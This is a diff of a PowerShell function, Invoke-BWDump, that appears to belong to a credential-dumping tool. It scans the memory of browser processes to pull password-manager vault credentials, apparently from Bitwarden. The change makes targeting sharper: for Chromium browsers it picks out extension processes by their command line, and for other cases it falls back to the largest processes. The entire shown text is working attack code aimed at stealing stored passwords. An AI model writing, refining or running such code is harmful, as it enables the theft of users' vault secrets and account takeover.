@@ -873,10 +873,28 @@ function Invoke-BWDump {
             }
 
             $browsersFound = $true
-            # Chromium: scan the top 3 largest renderer processes (vault data lives in renderer heap)
-            # Firefox: scan the top 3 largest content processes
-            $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
-            Write-Status "$browser ($($procs.Count) procs, scanning top $($targets.Count) by memory)" "info"
+            $targets = @()
+            if ($browser -ne "Firefox") {
+                # Chromium: find --extension-process instances (service workers + extension renderers)
+                foreach ($p in $procs) {
+                    try {
+                        $cmd = (Get-CimInstance Win32_Process -Filter "ProcessId=$($p.Id)" -ErrorAction SilentlyContinue).CommandLine
+                        if ($cmd -match '--extension-process') {
+                            $targets += $p
+                        }
+                    } catch {}
+                }
+                if ($targets.Count -gt 0) {
+                    $targets = $targets | Sort-Object WorkingSet64 -Descending
+                    Write-Status "$browser ($($procs.Count) procs, $($targets.Count) extension process(es))" "info"
+                } else {
+                    $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
+                    Write-Status "$browser ($($procs.Count) procs, no --extension-process flag, scanning top 3)" "info"
+                }
+            } else {
+                $targets = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 3
+                Write-Status "$browser ($($procs.Count) procs, scanning top 3)" "info"
+            }
             foreach ($t in $targets) {
                 Scan-ProcessMemory -Target $t -Credentials ([ref]$credentials) -DoSaveDump $false -Label "$browser ext"
             }
